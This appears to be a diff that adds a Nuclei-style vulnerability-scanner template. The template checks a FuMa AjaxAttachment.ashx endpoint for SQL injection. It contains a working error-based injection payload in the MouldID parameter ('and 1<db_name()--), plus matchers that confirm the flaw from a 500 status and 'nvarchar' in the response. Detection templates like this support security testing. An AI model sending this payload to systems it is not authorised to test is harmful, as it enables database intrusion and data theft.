@@ -1,0 +1,25 @@
+id: FuMa-AjaxAttachment-sqlInjection
+
+info:
+  name: FuMa-AjaxAttachment-sqlInjection
+  author: iSee857
+  severity: high
+  description: |
+    FuMa-AjaxAttachment-sqlInjection
+
+http:
+  - raw:
+      - |
+        GET /m/Dingding/Ajax/AjaxAttachment.ashx?method=saveAttach&MouldID=1%27and+1%3Cdb_name%28%29-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "<title>"
+          - "nvarchar"
